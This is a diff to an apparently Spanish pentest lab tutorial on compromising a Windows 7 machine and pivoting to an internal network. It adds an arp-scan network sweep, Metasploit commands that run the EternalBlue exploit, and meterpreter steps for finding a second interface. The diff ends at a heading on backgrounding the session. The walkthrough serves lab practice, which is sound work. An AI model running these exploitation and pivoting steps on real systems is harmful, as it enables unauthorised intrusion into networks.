@@ -95,11 +95,33 @@ Con estos pasos, habrás confirmado que todas las máquinas están configuradas 
 
 #### Infiltración en la Máquina Windows7 y Pivoting
 
-### 1. Escaneo de Interfaces de Red con `arp-scan`
+1. **Escaneo de Interfaces de Red con `arp-scan`**
 
 Para identificar las máquinas en la red local:
 
 ```bash
 arp-scan -I eth0 --localnet
 ```
+
+2. **Explotación de la Vulnerabilidad EternalBlue**
+
+```
+msfconsole
+search eternalblue
+use 0
+show options
+run
+```
+
+3. **Verificación de Interfaces de Red para Pivoting**
+
+En meterpreter.
+
+```bash
+ifconfig
+```
+
+Busca una segunda IP en la red NAT en la interfaz 13. Esta podría indicar una red interna para pivoting. Si solo hay una IP, tal vez esta máquina no sea adecuada para pivoting.
+
+4. **Poner en Segundo Plano la Sesión de Meterpreter**
 
